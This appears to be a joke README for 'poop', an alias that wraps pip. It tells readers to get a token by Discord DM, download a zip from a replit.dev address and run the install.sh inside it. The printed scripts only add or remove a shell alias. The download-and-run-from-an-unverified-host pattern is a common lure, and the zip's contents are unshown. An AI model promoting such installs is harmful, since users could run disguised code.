# 💩 poop – The Better `pip` (yes, seriously)

> A stupidly useful `pip` alias with chaotic vibes  
> Built by someone who should’ve been sleeping instead.  
> 💬 Get your unlock token via Discord DM.

## 🔓 Unlock Access

To unlock and use poop, message me on **Discord** and I’ll send you your personal token.

Example unlock token:
```
# poop
```

You’ll be asked for it during installation. No token = no poop 🚫💩

## ⬇️ Download

👉 https://2fd903f6-53d1-4f11-adbe-f96709b43aa1-00-2k6f0am9tagdr.janeway.replit.dev/

Click the link and download the `.zip` file with the installer inside.

## ⚙️ Installation (macOS/Linux)

1. Open your terminal
2. RENAME IT TO pie dont ask
3. Unzip the file and enter the folder  
4. Run:

```bash
chmod +x install.sh
./install.sh
```

You'll be asked to enter your unlock token. If it's valid, poop will be installed.

## ❌ Uninstallation

If you ever want to remove poop from your system:

```bash
chmod +x uninstall.sh
./uninstall.sh
```

It will clean up your shell aliases. The poop is flushed 🧻

## 🚀 How to Use

It's exactly like `pip`. Just… funnier.

### Example:
```bash
# Normal pip:
pip install requests

# With extra 💩:
poop install requests
```

100% compatible with pip.  
Also prints a random funny message sometimes. Because why not?

## 📜 install.sh (included in ZIP)

```bash
#!/bin/bash

echo "💩 Welcome to poop installer!"
read -p "Enter unlock token: " token

if [[ "$token" != "# poop" ]]; then
    echo "❌ Invalid token. No poop for you."
    exit 1
fi

echo "✅ Token accepted. Installing poop..."

echo "alias poop='pip'" >> ~/.bashrc 2>/dev/null
echo "alias poop='pip'" >> ~/.zshrc 2>/dev/null

echo "✅ poop installed successfully!"
echo "👉 Restart your terminal or run: source ~/.bashrc or source ~/.zshrc"
```

## 📜 uninstall.sh (also included)

```bash
#!/bin/bash

echo "🧼 Removing poop from your system..."

sed -i '' '/alias poop=.*/d' ~/.bashrc 2>/dev/null
sed -i '' '/alias poop=.*/d' ~/.zshrc 2>/dev/null

echo "✅ poop has been flushed."
```

## 🤝 Need Help?

Message me on **Discord**. I’ll:
- Send your unlock token
- Help you install poop
- Probably make bad jokes

## 👑 Credits

Made by: **unix**  
Assisted by: **ChatGPT**  
Powered by: ☕ + 💀 + 😈 + 😴

> “It may be called poop, but it works beautifully.” – No one ever  
> “The only pip I trust.” – A guy on the internet

> 💩 Happy pooping!
